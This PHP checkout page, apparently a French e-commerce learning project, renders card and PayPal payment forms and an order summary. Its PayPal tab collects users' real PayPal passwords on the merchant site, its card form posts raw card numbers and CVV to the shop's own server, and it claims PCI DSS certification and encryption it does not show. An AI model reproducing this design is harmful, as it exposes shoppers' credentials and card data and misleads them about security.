<?php
/**
 * Page de paiement - Formulaire carte bancaire + PayPal
 */

require_once __DIR__ . '/../config/database.php';

$page_title = 'Paiement sécurisé';

// Vérifier que l'utilisateur est connecté

if (!isset($_SESSION['user_id'])) {
    $_SESSION['error_message'] = "Vous devez être connecté pour effectuer un paiement.";
    redirect('/ecommerce/pages/login.php');
}

// Vérifier que les informations de livraison sont présentes

if (!isset($_SESSION['delivery_info'])) {
    $_SESSION['error_message'] = "Veuillez d'abord renseigner vos informations de livraison.";
    redirect('/ecommerce/pages/checkout.php');
}

// Récupérer les informations de livraison

$delivery = $_SESSION['delivery_info'];

// Récupérer le panier

$pdo = getDBConnection();
$cart_items = [];
$total = 0;

if ($pdo) {
    try {
        $stmt = $pdo->prepare("
            SELECT 
                c.id as cart_id,
                c.quantite,
                i.id,
                i.nom,
                i.prix,
                i.image
            FROM panier c
            INNER JOIN items i ON c.id_item = i.id
            WHERE c.id_user = ?
        ");
        $stmt->execute([$_SESSION['user_id']]);
        $cart_items = $stmt->fetchAll();
        
        // Calculer le total

        foreach ($cart_items as $item) {
            $total += $item['prix'] * $item['quantite'];
        }
    } catch (PDOException $e) {
        error_log("Erreur: " . $e->getMessage());
    }
}

// Si le panier est vide, rediriger

if (empty($cart_items)) {
    $_SESSION['error_message'] = "Votre panier est vide.";
    redirect('/ecommerce/pages/cart.php');
}

// Calculer frais de livraison et total final

$frais_livraison = $total >= 50 ? 0 : 5;
$total_final = $total + $frais_livraison;

include __DIR__ . '/../includes/header.php';
?>

<!-- Lien vers le CSS de paiement -->

<link rel="stylesheet" href="/ecommerce/assets/css/payment.css">

<div class="payment-container">

    <!-- En-tête sécurisé -->

    <div class="payment-header">
        <div class="security-badge">
            <i class="fas fa-lock"></i>
            <span>Paiement 100% sécurisé</span>
        </div>
        <h1 class="payment-title">
            <i class="fas fa-credit-card"></i> Paiement
        </h1>
        <p class="payment-subtitle">Finalisez votre commande en toute sécurité</p>
    </div>

    <div class="payment-grid">

        <!-- Colonne gauche : Formulaire de paiement -->

        <div class="payment-form-column">
            
            <!-- Sélection du mode de paiement -->

            <div class="payment-methods-selector">
                <h3>Choisissez votre mode de paiement</h3>
                
                <div class="payment-methods-tabs">
                    <button type="button" class="payment-tab active" data-method="card">
                        <i class="fas fa-credit-card"></i>
                        <span>Carte bancaire</span>
                    </button>
                    <button type="button" class="payment-tab" data-method="paypal">
                        <i class="fab fa-paypal"></i>
                        <span>PayPal</span>
                    </button>
                </div>
            </div>

            <!-- Formulaire Carte Bancaire -->

            <div id="card-payment" class="payment-method-content active">
                <form id="cardPaymentForm" method="POST" action="/ecommerce/pages/process-payment.php">
                    <input type="hidden" name="payment_method" value="carte_bancaire">
                    
                    <!-- Cartes acceptées -->
                    <div class="accepted-cards">
                        <span class="accepted-cards-label">Cartes acceptées :</span>
                        <div class="card-logos">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express">
                        </div>
                    </div>

                    <!-- Numéro de carte -->

                    <div class="form-group">
                        <label for="card_number">
                            <i class="fas fa-credit-card"></i>
                            Numéro de carte *
                        </label>
                        <input 
                            type="text" 
                            id="card_number" 
                            name="card_number"
                            class="form-control card-input"
                            placeholder="1234 5678 9012 3456"
                            maxlength="19"
                            required
                            autocomplete="cc-number">
                        <div class="card-type-icon"></div>
                    </div>

                    <!-- Nom du titulaire -->

                    <div class="form-group">
                        <label for="card_holder">
                            <i class="fas fa-user"></i>
                            Nom du titulaire *
                        </label>
                        <input 
                            type="text" 
                            id="card_holder" 
                            name="card_holder"
                            class="form-control"
                            placeholder="JEAN DUPONT"
                            required
                            autocomplete="cc-name">
                    </div>

                    <!-- Date d'expiration et CVV -->

                    <div class="form-row">
                        <div class="form-group">
                            <label for="card_expiry">
                                <i class="fas fa-calendar-alt"></i>
                                Date d'expiration *
                            </label>
                            <input 
                                type="text" 
                                id="card_expiry" 
                                name="card_expiry"
                                class="form-control"
                                placeholder="MM/AA"
                                maxlength="5"
                                required
                                autocomplete="cc-exp">
                        </div>
                        <div class="form-group">
                            <label for="card_cvv">
                                <i class="fas fa-lock"></i>
                                CVV *
                                <span class="cvv-help" title="3 chiffres au dos de votre carte">
                                    <i class="fas fa-question-circle"></i>
                                </span>
                            </label>
                            <input 
                                type="text" 
                                id="card_cvv" 
                                name="card_cvv"
                                class="form-control"
                                placeholder="123"
                                maxlength="4"
                                required
                                autocomplete="cc-csc">
                        </div>
                    </div>

                    <!-- Sauvegarder la carte -->

                    <div class="form-group checkbox-group">
                        <label class="checkbox-label">
                            <input type="checkbox" name="save_card">
                            <span>Enregistrer cette carte pour mes prochains achats</span>
                        </label>
                    </div>

                    <!-- Bouton de paiement -->

                    <button type="submit" class="btn-pay">
                        <i class="fas fa-lock"></i>
                        Payer <?php echo number_format($total_final, 2, ',', ' '); ?> €
                    </button>

                    <!-- Garanties de sécurité -->

                    <div class="security-badges">
                        <div class="security-item">
                            <i class="fas fa-shield-alt"></i>
                            <span>Paiement sécurisé SSL</span>
                        </div>
                        <div class="security-item">
                            <i class="fas fa-user-shield"></i>
                            <span>Données protégées</span>
                        </div>
                        <div class="security-item">
                            <i class="fas fa-check-circle"></i>
                            <span>Certification PCI DSS</span>
                        </div>
                    </div>
                </form>
            </div>

            <!-- Formulaire PayPal -->

            <div id="paypal-payment" class="payment-method-content">
                <div class="paypal-info">
                    <div class="paypal-logo">
                        <i class="fab fa-paypal"></i>
                    </div>
                    <h3>Payer avec PayPal</h3>
                    <p>Connectez-vous à votre compte PayPal pour finaliser votre paiement en toute sécurité.</p>
                    
                    <!-- Formulaire PayPal -->

                    <form method="POST" action="/ecommerce/pages/process-payment.php" style="margin-top: 2rem;">
                        <input type="hidden" name="payment_method" value="paypal">
                        
                        <!-- Identifiants PayPal -->

                        <div style="background: #0070ba; padding: 1.5rem; border-radius: 8px; margin-bottom: 1.5rem;">
                            <h4 style="margin-bottom: 1rem; font-size: 1rem; color: white;">
                                <i class="fab fa-paypal"></i> Connexion PayPal
                            </h4>
                            
                            <div style="margin-bottom: 1rem;">
                                <label style="display: block; margin-bottom: 0.5rem; color: white; font-size: 0.9rem;">Email PayPal *</label>
                                <input type="email" name="paypal_email" required
                                       placeholder="votre-email@example.com"
                                       style="width: 100%; padding: 0.75rem; border: 2px solid #003087; border-radius: 5px; font-size: 1rem;">
                            </div>
                            
                            <div>
                                <label style="display: block; margin-bottom: 0.5rem; color: white; font-size: 0.9rem;">Mot de passe PayPal *</label>
                                <input type="password" name="paypal_password" required
                                       placeholder="••••••••"
                                       style="width: 100%; padding: 0.75rem; border: 2px solid #003087; border-radius: 5px; font-size: 1rem;">
                            </div>
                            
                            <small style="display: block; margin-top: 1rem; color: #e0e0e0; font-size: 0.85rem;">
                                <i class="fas fa-lock"></i> Vos identifiants PayPal sont sécurisés et cryptés
                            </small>
                        </div>
                        
                        <ul class="paypal-benefits">
                            <li><i class="fas fa-check"></i> Paiement sécurisé par PayPal</li>
                            <li><i class="fas fa-check"></i> Protection des achats</li>
                            <li><i class="fas fa-check"></i> Vos données bancaires restent confidentielles</li>
                        </ul>

                        <button type="submit" class="btn-paypal">
                            <i class="fab fa-paypal"></i>
                            Payer <?php echo number_format($total_final, 2, ',', ' '); ?> € avec PayPal
                        </button>
                    </form>
                </div>
            </div>
        </div>

        <!-- Colonne droite : Récapitulatif -->

        <div class="payment-summary-column">
            <div class="payment-summary sticky">
                <h3 class="summary-title">
                    <i class="fas fa-file-invoice-dollar"></i>
                    Récapitulatif
                </h3>

                <!-- Adresse de livraison -->

                <div class="summary-section">
                    <h4><i class="fas fa-truck"></i> Livraison</h4>
                    <div class="delivery-address">
                        <p><strong><?php echo escape($delivery['prenom'] . ' ' . $delivery['nom']); ?></strong></p>
                        <p><?php echo escape($delivery['adresse']); ?></p>
                        <p><?php echo escape($delivery['code_postal'] . ' ' . $delivery['ville']); ?></p>
                        <p><i class="fas fa-phone"></i> <?php echo escape($delivery['telephone']); ?></p>
                    </div>
                    <a href="/ecommerce/pages/checkout.php" class="modify-link">
                        <i class="fas fa-edit"></i> Modifier
                    </a>
                </div>

                <!-- Articles -->

                <div class="summary-section">
                    <h4><i class="fas fa-shopping-bag"></i> Articles (<?php echo count($cart_items); ?>)</h4>
                    <div class="summary-items">
                        <?php foreach ($cart_items as $item): ?>
                            <div class="summary-item">
                                <?php 
                                $image_path = __DIR__ . '/../assets/images/' . ($item['image'] ?? '');
                                $has_image = !empty($item['image']) && file_exists($image_path);
                                ?>
                                
                                <?php if ($has_image): ?>
                                    <img src="/ecommerce/assets/images/<?php echo escape($item['image']); ?>" alt="<?php echo escape($item['nom']); ?>">
                                <?php else: ?>
                                    <div class="item-placeholder">📷</div>
                                <?php endif; ?>
                                
                                <div class="item-details">
                                    <p class="item-name"><?php echo escape($item['nom']); ?></p>
                                    <p class="item-quantity">Qté : <?php echo $item['quantite']; ?></p>
                                </div>
                                <div class="item-price">
                                    <?php echo number_format($item['prix'] * $item['quantite'], 2, ',', ' '); ?> €
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>

                <!-- Totaux -->

                <div class="summary-totals">
                    <div class="total-row">
                        <span>Sous-total</span>
                        <span><?php echo number_format($total, 2, ',', ' '); ?> €</span>
                    </div>
                    <div class="total-row">
                        <span>Livraison</span>
                        <span class="<?php echo $frais_livraison == 0 ? 'free-shipping' : ''; ?>">
                            <?php echo $frais_livraison == 0 ? 'Gratuite' : number_format($frais_livraison, 2, ',', ' ') . ' €'; ?>
                        </span>
                    </div>
                    <div class="total-row total-final">
                        <span>Total à payer</span>
                        <span><?php echo number_format($total_final, 2, ',', ' '); ?> €</span>
                    </div>
                </div>

                <!-- Garanties -->

                <div class="summary-guarantees">
                    <div class="guarantee-item">
                        <i class="fas fa-undo-alt"></i>
                        <span>Retours gratuits 30 jours</span>
                    </div>
                    <div class="guarantee-item">
                        <i class="fas fa-headset"></i>
                        <span>Support client 7j/7</span>
                    </div>
                    <div class="guarantee-item">
                        <i class="fas fa-shield-alt"></i>
                        <span>Garantie satisfait ou remboursé</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- JavaScript pour la page de paiement -->

<script>
document.addEventListener('DOMContentLoaded', function() {

    // Gestion des onglets de paiement

    const tabs = document.querySelectorAll('.payment-tab');
    const contents = document.querySelectorAll('.payment-method-content');
    
    tabs.forEach(tab => {
        tab.addEventListener('click', function() {

            // Retirer la classe active de tous les onglets

            tabs.forEach(t => t.classList.remove('active'));
            contents.forEach(c => c.classList.remove('active'));
            
            // Ajouter la classe active à l'onglet cliqué

            this.classList.add('active');
            const method = this.dataset.method;
            document.getElementById(method + '-payment').classList.add('active');
        });
    });
    
    // Formatage du numéro de carte (espace tous les 4 chiffres)

    const cardNumberInput = document.getElementById('card_number');
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
            
            // Détecter le type de carte

            detectCardType(value);
        });
    }
    
    // Formatage de la date d'expiration (MM/AA)

    const expiryInput = document.getElementById('card_expiry');
    if (expiryInput) {
        expiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });
    }
    
    // Validation CVV (seulement des chiffres)

    const cvvInput = document.getElementById('card_cvv');
    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }
    
    // Détection du type de carte

    function detectCardType(number) {
        const cardTypeIcon = document.querySelector('.card-type-icon');
        if (!cardTypeIcon) return;
        
        const firstDigit = number.charAt(0);
        const firstTwo = number.substring(0, 2);
        
        if (firstDigit === '4') {
            cardTypeIcon.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">';
        } else if (firstTwo >= '51' && firstTwo <= '55') {
            cardTypeIcon.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">';
        } else if (firstTwo === '34' || firstTwo === '37') {
            cardTypeIcon.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express">';
        } else {
            cardTypeIcon.innerHTML = '';
        }
    }
    
    // Validation du formulaire

    const cardForm = document.getElementById('cardPaymentForm');
    if (cardForm) {
        cardForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Validation basique

            const cardNumber = document.getElementById('card_number').value.replace(/\s/g, '');
            const cardHolder = document.getElementById('card_holder').value;
            const cardExpiry = document.getElementById('card_expiry').value;
            const cardCVV = document.getElementById('card_cvv').value;
            
            if (cardNumber.length < 13 || cardNumber.length > 19) {
                alert('Numéro de carte invalide');
                return;
            }
            
            if (cardHolder.trim().length < 3) {
                alert('Nom du titulaire invalide');
                return;
            }
            
            if (!/^\d{2}\/\d{2}$/.test(cardExpiry)) {
                alert('Date d\'expiration invalide (format MM/AA)');
                return;
            }
            
            if (cardCVV.length < 3 || cardCVV.length > 4) {
                alert('CVV invalide');
                return;
            }
            
            // Afficher un loader pendant le traitement

            const submitBtn = this.querySelector('.btn-pay');
            const originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Traitement en cours...';
            submitBtn.disabled = true;
            
            // Soumettre le formulaire
            this.submit();
            
        });
    }
});
</script>

<?php include __DIR__ . '/../includes/footer.php'; ?>